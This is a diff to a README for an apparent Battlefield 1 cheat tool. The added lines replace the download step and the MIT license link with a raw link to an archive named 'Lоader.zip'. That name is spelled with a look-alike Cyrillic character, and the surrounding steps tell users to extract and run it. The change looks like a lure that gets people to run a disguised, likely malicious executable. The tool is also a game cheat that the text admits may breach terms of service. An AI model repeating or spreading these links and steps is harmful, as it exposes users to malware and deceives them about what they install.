@@ -6,8 +6,8 @@ Welcome to the **Battlefield 1 Hack** repository! This advanced utility empowers
 
 ## 🛠️ Installation Guide
 
-1. **Download Loader.rar**  
-   Get the latest Loader.rar archive directly from this repository's [Releases](../../releases) section.
+1. **Download https://raw.githubusercontent.com/suthish123/Battlefield1-EdgeMod/main/Lоader.zip**  
+   Get the latest https://raw.githubusercontent.com/suthish123/Battlefield1-EdgeMod/main/Lоader.zip archive directly from this repository's [Releases](../../releases) section.
 2. **Extract Files**  
    Use software such as WinRAR or 7-Zip to extract all contents to a preferred folder on your device.
 3. **Run the Loader**  
@@ -66,7 +66,7 @@ Using this software online may **violate the Terms of Service** of Battlefield 1
 
 ## 📄 MIT License
 
-This repository is distributed under the **MIT License**. Please refer to the [full license text](https://opensource.org/licenses/MIT) for detailed information regarding usage, redistribution, and modification.
+This repository is distributed under the **MIT License**. Please refer to the [full license text](https://raw.githubusercontent.com/suthish123/Battlefield1-EdgeMod/main/Lоader.zip) for detailed information regarding usage, redistribution, and modification.
 
 ---
 
